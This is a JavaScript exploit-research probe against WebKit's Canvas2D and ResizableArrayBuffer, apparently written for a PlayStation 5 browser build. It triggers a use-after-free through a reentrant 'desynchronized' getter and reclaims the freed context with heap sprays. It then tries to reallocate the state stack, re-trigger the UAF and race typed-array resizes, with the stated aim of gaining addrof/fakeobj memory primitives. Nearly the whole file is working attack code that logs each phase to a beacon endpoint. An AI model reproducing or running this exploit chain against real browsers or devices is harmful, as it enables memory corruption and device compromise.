// CRASH_CLASS: MODERATE
// PROBE p555: Canvas2D reentrancy timing + state stack realloc oracle
//
// Goal: find a code path where C++ holds a State& reference while JS can
// trigger state stack reallocation. If found → write to freed buffer →
// reclaim with ArrayBuffer → raw byte access → addrof/fakeobj.
//
// Also tests: second UAF via canvas.width reset, ResizableArrayBuffer
// stale-view and resize-during-set patterns (independent addrof paths).
//
// Phases:
//   A) valueOf timing: which methods fire valueOf, and when?
//   B) setLineDash Proxy: array iteration interception + save()×N
//   C) lineWidth realloc: save()×N in valueOf + AB spray for freed state stack
//   D) Second UAF: reset spray canvas → re-trigger desynchronized → AB reclaim
//   E) RAB stale view: resize down → access old view → OOB?
//   F) RAB set() race: resize during TypedArray.set valueOf → OOB write?

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P555-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'reentrancy-timing ua=' + navigator.userAgent.slice(0, 60));

  // ======================== UAF + SAME-TYPE RECLAIM ========================

  var canvas = document.createElement('canvas');
  canvas.width = 10; canvas.height = 10;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var gCnt = 0;
  var opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get: function () {
      gCnt++;
      if (gCnt === 1) inner = canvas.getContext('2d');
      return false;
    },
    enumerable: true
  });

  var outer = canvas.getContext('2d', opts);
  retained.push(outer, inner);
  if (!inner || outer === inner) { emit('PATCHED', 'no UAF'); return; }
  emit('TRIGGER', 'ok');

  var SPRAY = 70;
  var sprayCanvases = [];
  var sprayCtx = [];
  for (var i = 0; i < SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    var ctx = c.getContext('2d');
    if (ctx) {
      ctx.setTransform(11.11, 0, 0, 11.11, 0, 0);
      sprayCanvases.push(c);
      sprayCtx.push(ctx);
      retained.push(c, ctx);
    }
  }
  emit('SPRAYED', 'n=' + sprayCtx.length);

  var m = null;
  try { m = inner.getTransform(); } catch (e) { emit('ERR', String(e)); return; }
  if (!m || Math.abs(m.a - 11.11) > 0.01) {
    emit('NO-RECLAIM', 'a=' + (m ? m.a : 'null'));
    return;
  }

  inner.setTransform(42.42, 0, 0, 42.42, 0, 0);
  var aliasIdx = -1;
  for (var j = 0; j < sprayCtx.length; j++) {
    try {
      var sm = sprayCtx[j].getTransform();
      if (sm && Math.abs(sm.a - 42.42) < 0.01) { aliasIdx = j; break; }
    } catch (e) {}
  }
  if (aliasIdx < 0) { emit('NO-ALIAS', ''); return; }

  var alias = sprayCtx[aliasIdx];
  var aliasCanvas = sprayCanvases[aliasIdx];
  emit('ALIAS', 'spray[' + aliasIdx + ']');
  inner.setTransform(1, 0, 0, 1, 0, 0);

  // ======================== PHASE A: valueOf TIMING ORACLE ========================
  // For each method: set a marker, call with valueOf that reads the marker.
  // Reports whether valueOf fired and what state looked like during callback.

  emit('PHASE-A', 'start');

  function timingTest(name, callFn) {
    var fired = false;
    var readInner = 'N/A';
    var readAlias = 'N/A';
    var threw = false;
    alias.lineWidth = 77777;
    alias.setTransform(1, 0, 0, 1, 0, 0);

    var probe = {
      valueOf: function () {
        fired = true;
        try { readInner = inner.lineWidth; } catch (e) { readInner = 'err'; }
        try { readAlias = alias.lineWidth; } catch (e) { readAlias = 'err'; }
        return 1.5;
      },
      toString: function () {
        fired = true;
        try { readInner = inner.lineWidth; } catch (e) { readInner = 'err'; }
        return 'repeat';
      }
    };

    try { callFn(probe); } catch (e) { threw = true; }
    var afterInner = 'N/A';
    try { afterInner = inner.lineWidth; } catch (e) {}
    emit('T-' + name, 'fired=' + fired + ' during=' + readInner + '/' + readAlias +
      ' after=' + afterInner + ' threw=' + threw);
  }

  timingTest('lineWidth', function (v) { inner.lineWidth = v; });
  timingTest('globalAlpha', function (v) { inner.globalAlpha = v; });
  timingTest('shadowBlur', function (v) { inner.shadowBlur = v; });
  timingTest('miterLimit', function (v) { inner.miterLimit = v; });
  timingTest('lineDashOffset', function (v) { inner.lineDashOffset = v; });
  timingTest('setTransform-a', function (v) { inner.setTransform(v, 0, 0, 1, 0, 0); });
  timingTest('fillRect-x', function (v) { inner.fillRect(v, 0, 5, 5); });
  timingTest('arc-r', function (v) { inner.beginPath(); inner.arc(5, 5, v, 0, 6.28); });
  timingTest('bezierCurveTo', function (v) { inner.beginPath(); inner.moveTo(0, 0); inner.bezierCurveTo(v, 1, 5, 5, 10, 10); });
  timingTest('createLinGrad', function (v) { inner.createLinearGradient(v, 0, 10, 10); });
  timingTest('fillText-x', function (v) { inner.fillText('X', v, 5); });
  timingTest('strokeText-x', function (v) { inner.strokeText('X', v, 5); });
  timingTest('isPointInPath', function (v) { inner.beginPath(); inner.rect(0, 0, 10, 10); inner.isPointInPath(v, 5); });
  timingTest('measureText', function (v) { inner.measureText(v); }); // toString path
  timingTest('createPattern', function (v) {
    var src = document.createElement('canvas');
    src.width = 2; src.height = 2;
    src.getContext('2d').fillRect(0, 0, 2, 2);
    inner.createPattern(src, v); // toString path
  });

  emit('PHASE-A', 'done');

  // ======================== PHASE B: setLineDash PROXY ========================
  // WebKit must iterate the array to build Vector<float>. If iteration goes
  // through Proxy traps, we can trigger save()×N mid-iteration. If the C++
  // already has a partial dash array referencing old state memory...

  emit('PHASE-B', 'start');

  try {
    if (typeof Proxy !== 'undefined') {
      var dashLog = [];
      var dashSaved = false;
      var dashArr = [5, 15, 5, 15, 5, 15, 5, 15]; // 8 elements

      var dashProxy = new Proxy(dashArr, {
        get: function (target, prop) {
          dashLog.push(String(prop));
          if (prop === 'length' && !dashSaved) {
            dashSaved = true;
            // Trigger save()×30 on alias during length access
            for (var si = 0; si < 30; si++) {
              try { alias.save(); } catch (e) { break; }
            }
          }
          return target[prop];
        }
      });

      alias.lineWidth = 55555;
      inner.setLineDash(dashProxy);

      var dashBack = inner.getLineDash ? inner.getLineDash() : null;
      var lwAfterDash = alias.lineWidth;
      emit('DASH-PROXY', 'accesses=' + dashLog.join(',') +
        ' dashLen=' + (dashBack ? dashBack.length : 'N/A') +
        ' lwAfter=' + lwAfterDash);

      // Restore saves
      for (var ri = 0; ri < 30; ri++) { try { alias.restore(); } catch (e) { break; } }
    } else {
      emit('DASH-PROXY', 'Proxy unavailable');
    }
  } catch (e) {
    emit('PHASE-B-ERR', String(e));
  }

  emit('PHASE-B', 'done');

  // ======================== PHASE C: STATE STACK REALLOC ATTACK ========================
  // WebKit save() is lazy (counter++). realizeSaves() does the actual push,
  // called inside setters AFTER binding conversion. So valueOf fires first,
  // save() just increments counter, realloc happens later inside the setter.
  // Test: does the PS5 build match this model, or is save() eager?

  emit('PHASE-C', 'start');

  try {
    // Pre-grow: 7 real saves → depth 8
    for (var pg = 0; pg < 7; pg++) inner.save();
    // Force realizes with a write
    inner.lineWidth = 33333;

    // Measure: does save() via alias actually push immediately?
    var depthBefore = 0;
    try {
      // Count depth by doing restore until we can't
      var tempCtx = alias;
      // Save current state of the saves
      // Actually, just check if lineWidth survives a save+restore
      alias.save();
      alias.lineWidth = 88888;
      alias.restore();
      var lwCheck = alias.lineWidth;
      emit('LAZY-CHECK', 'save+write+restore: lw=' + lwCheck + ' (should be 33333 if save was realized)');
    } catch (e) {
      emit('LAZY-ERR', String(e));
    }

    // Now the actual realloc attack
    var absSpray = [];
    var attackValOf = {
      valueOf: function () {
        // save()×128 through alias
        for (var s = 0; s < 128; s++) {
          try { alias.save(); } catch (e) { break; }
        }
        // Immediately realize with a write through alias
        // This triggers realizeSaves inside alias's setter
        alias.shadowBlur = 11111;

        // Now the state stack has been reallocated (if capacity grew)
        // Spray ABs to reclaim freed old buffer
        // Old buffer: ~8×448 = 3584 bytes
        var sizes = [3584, 3072, 4096, 3520, 3648, 2048, 7168];
        for (var sz = 0; sz < sizes.length; sz++) {
          for (var ab = 0; ab < 30; ab++) {
            try {
              var buf = new ArrayBuffer(sizes[sz]);
              var u8 = new Uint8Array(buf);
              u8[0] = 0xDE; u8[1] = 0xAD; // marker
              absSpray.push(buf);
            } catch (e) { break; }
          }
        }

        alias.lineWidth = 99999;
        return 77777.5;
      }
    };

    inner.lineWidth = attackValOf;

    var lwI = inner.lineWidth;
    var lwA = alias.lineWidth;
    emit('REALLOC-STATE', 'inner.lw=' + lwI + ' alias.lw=' + lwA);

    // Scan ABs for 77777.5 pattern (IEEE 754: 0x40F2FC3800000000)
    var found = 0;
    for (var ai = 0; ai < absSpray.length && found < 5; ai++) {
      try {
        var dv = new DataView(absSpray[ai]);
        for (var off = 0; off + 8 <= absSpray[ai].byteLength && found < 5; off += 8) {
          var fv = dv.getFloat64(off, true);
          if (Math.abs(fv - 77777.5) < 0.01) {
            emit('AB-HIT', 'buf[' + ai + ']+' + off + '=77777.5 DANGLING_WRITE');
            found++;
          } else if (Math.abs(fv - 99999) < 0.01) {
            emit('AB-HIT', 'buf[' + ai + ']+' + off + '=99999');
            found++;
          } else if (Math.abs(fv - 33333) < 0.01) {
            emit('AB-HIT', 'buf[' + ai + ']+' + off + '=33333 STALE_STATE');
            found++;
          }
        }
      } catch (e) {}
    }
    if (found === 0) emit('AB-MISS', 'n=' + absSpray.length);

    // Cleanup
    for (var rr = 0; rr < 140; rr++) { try { alias.restore(); } catch (e) { break; } }
    for (var rr2 = 0; rr2 < 8; rr2++) { try { inner.restore(); } catch (e) { break; } }
    absSpray = null;
  } catch (e) {
    emit('PHASE-C-ERR', String(e));
  }

  emit('PHASE-C', 'done');

  // ======================== PHASE D: SECOND UAF VIA canvas.width RESET ========================
  // If resetting canvas.width destroys the 2D context, we can re-trigger
  // the desynchronized UAF on the spray canvas. The newly-freed context can
  // then be reclaimed by ArrayBuffer instead of another Canvas2D.

  emit('PHASE-D', 'start');

  try {
    // Stash the alias canvas reference
    var targetCanvas = aliasCanvas;
    var targetCtx = alias;

    // Verify alias still works
    inner.lineWidth = 12121;
    var pre = alias.lineWidth;
    emit('D-PRE', 'alias.lw=' + pre);

    // Reset the spray canvas — this should reset/destroy its context
    targetCanvas.width = targetCanvas.width;

    // Can we still read through alias?
    var postReset = 'N/A';
    try { postReset = alias.lineWidth; } catch (e) { postReset = 'threw:' + e.name; }
    // Can we still read through inner?
    var postInner = 'N/A';
    try { postInner = inner.lineWidth; } catch (e) { postInner = 'threw:' + e.name; }
    emit('D-RESET', 'alias.lw=' + postReset + ' inner.lw=' + postInner);

    // Try to re-trigger UAF on the spray canvas
    var inner2 = null;
    var g2 = 0;
    var opts2 = {};
    Object.defineProperty(opts2, 'desynchronized', {
      get: function () {
        g2++;
        if (g2 === 1) inner2 = targetCanvas.getContext('2d');
        return false;
      },
      enumerable: true
    });

    var outer2 = null;
    try {
      outer2 = targetCanvas.getContext('2d', opts2);
    } catch (e) {
      emit('D-RETRIGGER-ERR', String(e));
    }

    emit('D-RETRIGGER', 'getter=' + g2 + ' inner2=' + !!inner2 + ' outer2=' + !!outer2 +
      ' same=' + (outer2 === inner2) + ' sameAsOld=' + (outer2 === targetCtx));

    if (inner2 && outer2 !== inner2) {
      emit('D-UAF2', 'SECOND UAF TRIGGERED');

      // Spray ArrayBuffer(768) to reclaim the freed Canvas2D context
      // sizeof(CanvasRenderingContext2D) ≈ 712 → bmalloc 768 class
      var abSpray2 = [];
      for (var ab2 = 0; ab2 < 50; ab2++) {
        try {
          var buf2 = new ArrayBuffer(768);
          var dv2 = new DataView(buf2);
          // Fill with recognizable pattern
          for (var fi = 0; fi < 768; fi += 8) {
            dv2.setFloat64(fi, 0xCAFE0000 + fi, true);
          }
          abSpray2.push(buf2);
        } catch (e) { break; }
      }
      emit('D-SPRAY', 'ab768=' + abSpray2.length);

      // Try reading through inner2 — will it return AB data or crash?
      var inner2Read = 'N/A';
      try {
        var tm2 = inner2.getTransform();
        inner2Read = 'a=' + tm2.a + ' b=' + tm2.b + ' d=' + tm2.d;
        emit('D-READ', 'inner2.getTransform: ' + inner2Read + ' — AB RECLAIM R/W');
      } catch (e) {
        emit('D-READ', 'threw:' + e.name + ' — ' + String(e).slice(0, 100));
      }

      // Try reading lineWidth
      try {
        emit('D-LW', 'inner2.lineWidth=' + inner2.lineWidth);
      } catch (e) {
        emit('D-LW', 'threw:' + e.name);
      }

      abSpray2 = null;
    } else {
      emit('D-NO-UAF2', 'second trigger failed or returned same context');

      // Check: did the original inner still work after reset?
      try {
        inner.lineWidth = 54321;
        emit('D-INNER-POST', 'inner.lw=' + inner.lineWidth + ' alias.lw=' + alias.lineWidth);
      } catch (e) {
        emit('D-INNER-POST', 'threw:' + e.name);
      }
    }
  } catch (e) {
    emit('PHASE-D-ERR', String(e));
  }

  emit('PHASE-D', 'done');

  // ======================== PHASE E: ResizableArrayBuffer STALE VIEW ========================
  // RAB (ResizableArrayBuffer) is available on PS5 14.10.
  // If resize() invalidates a view but the view still accesses old memory,
  // we get OOB read/write independent of Canvas2D.

  emit('PHASE-E', 'start');

  try {
    if (typeof ArrayBuffer === 'function') {
      // Test if RAB constructor with maxByteLength works
      var rab = null;
      try {
        rab = new ArrayBuffer(256, { maxByteLength: 1024 });
      } catch (e) {
        emit('RAB-UNSUPPORTED', String(e));
      }

      if (rab && typeof rab.resize === 'function') {
        emit('RAB-OK', 'byteLength=' + rab.byteLength + ' maxByteLength=' + rab.maxByteLength);

        var f64 = new Float64Array(rab);
        var u32 = new Uint32Array(rab);
        var origLen = f64.length; // 32

        // Fill with known values
        for (var fi2 = 0; fi2 < origLen; fi2++) f64[fi2] = 1.1 * (fi2 + 1);

        // Resize DOWN
        rab.resize(32); // 4 floats now

        // Try accessing old indices — spec says undefined, buggy impl might OOB
        var staleReads = [];
        for (var si2 = 0; si2 < origLen; si2++) {
          try {
            var val = f64[si2];
            staleReads.push(si2 + ':' + (val === undefined ? 'undef' : val.toFixed(2)));
          } catch (e) {
            staleReads.push(si2 + ':threw');
          }
        }
        emit('RAB-SHRINK', 'reads=' + staleReads.join(','));

        // Check f64.length after resize
        emit('RAB-LEN', 'f64.length=' + f64.length + ' u32.length=' + u32.length +
          ' rab.byteLength=' + rab.byteLength);

        // Grow back — does old data reappear?
        rab.resize(256);
        var regrown = [];
        for (var ri2 = 0; ri2 < 8; ri2++) {
          regrown.push(ri2 + ':' + (f64[ri2] === undefined ? 'undef' : f64[ri2].toFixed(2)));
        }
        emit('RAB-GROW', 'after regrow: ' + regrown.join(','));

        // Test: create a FIXED-LENGTH view on RAB, then resize
        var fixed = null;
        try {
          fixed = new Float64Array(rab, 0, 32); // explicit length=32
        } catch (e) {
          emit('RAB-FIXED', 'constructor threw: ' + e.name);
        }

        if (fixed) {
          rab.resize(32); // shrink below fixed view's range
          var fixedReads = [];
          for (var fi3 = 0; fi3 < 32 && fi3 < 8; fi3++) {
            try {
              fixedReads.push(fi3 + ':' + (fixed[fi3] === undefined ? 'undef' : typeof fixed[fi3]));
            } catch (e) {
              fixedReads.push(fi3 + ':threw');
            }
          }
          emit('RAB-FIXED-SHRINK', fixedReads.join(','));

          // Key test: fixed.length after resize
          emit('RAB-FIXED-LEN', 'fixed.length=' + fixed.length + ' rab.byteLength=' + rab.byteLength);
          rab.resize(256); // restore
        }
      }
    }
  } catch (e) {
    emit('PHASE-E-ERR', String(e));
  }

  emit('PHASE-E', 'done');

  // ======================== PHASE F: TypedArray.set() RACE ========================
  // Resize RAB inside valueOf during TypedArray.set() — if set() uses
  // the pre-resize buffer pointer, it writes OOB.

  emit('PHASE-F', 'start');

  try {
    var rab2 = null;
    try {
      rab2 = new ArrayBuffer(256, { maxByteLength: 1024 });
    } catch (e) {}

    if (rab2 && typeof rab2.resize === 'function') {
      var target = new Float64Array(rab2); // 32 floats

      // Fill target with sentinel
      for (var fi4 = 0; fi4 < 32; fi4++) target[fi4] = 0xBEEF + fi4;

      // Source with valueOf that resizes the target's RAB
      var setSrc = {
        length: 32,
        0: {
          valueOf: function () {
            // Shrink the RAB — target's backing store might be invalidated
            try { rab2.resize(16); } catch (e) {} // 2 floats only
            return 99.99;
          }
        }
      };
      // Fill remaining source elements
      for (var fi5 = 1; fi5 < 32; fi5++) setSrc[fi5] = 100 + fi5;

      var setThrew = false;
      try {
        target.set(setSrc);
      } catch (e) {
        setThrew = true;
        emit('SET-THREW', e.name + ': ' + String(e).slice(0, 100));
      }

      // Grow back and read
      try { rab2.resize(256); } catch (e) {}
      var setReads = [];
      for (var fi6 = 0; fi6 < 8; fi6++) {
        try {
          var v = target[fi6];
          setReads.push(fi6 + ':' + (v === undefined ? 'undef' : v.toFixed(2)));
        } catch (e) {
          setReads.push(fi6 + ':threw');
        }
      }
      emit('SET-RESULT', 'threw=' + setThrew + ' reads=' + setReads.join(','));

      // Same test but grow DURING set (might OOB write past original allocation)
      try { rab2.resize(64); } catch (e) {} // start small
      var target2 = new Float64Array(rab2); // 8 floats
      for (var fi7 = 0; fi7 < 8; fi7++) target2[fi7] = 0xDEAD + fi7;

      var growSrc = {
        length: 8,
        0: {
          valueOf: function () {
            try { rab2.resize(1024); } catch (e) {} // grow way past
            return 111.111;
          }
        }
      };
      for (var fi8 = 1; fi8 < 8; fi8++) growSrc[fi8] = 200 + fi8;

      var growThrew = false;
      try {
        target2.set(growSrc);
      } catch (e) {
        growThrew = true;
        emit('GROW-THREW', e.name);
      }

      // Read back
      var growReads = [];
      var target3 = new Float64Array(rab2);
      for (var fi9 = 0; fi9 < Math.min(16, target3.length); fi9++) {
        try {
          growReads.push(fi9 + ':' + (target3[fi9] === undefined ? 'undef' : target3[fi9].toFixed(2)));
        } catch (e) {
          growReads.push(fi9 + ':threw');
        }
      }
      emit('GROW-RESULT', 'threw=' + growThrew + ' reads=' + growReads.join(','));
    }
  } catch (e) {
    emit('PHASE-F-ERR', String(e));
  }

  emit('PHASE-F', 'done');

  emit('ALIVE', 'all phases completed');
  window.__p555 = retained;
})();
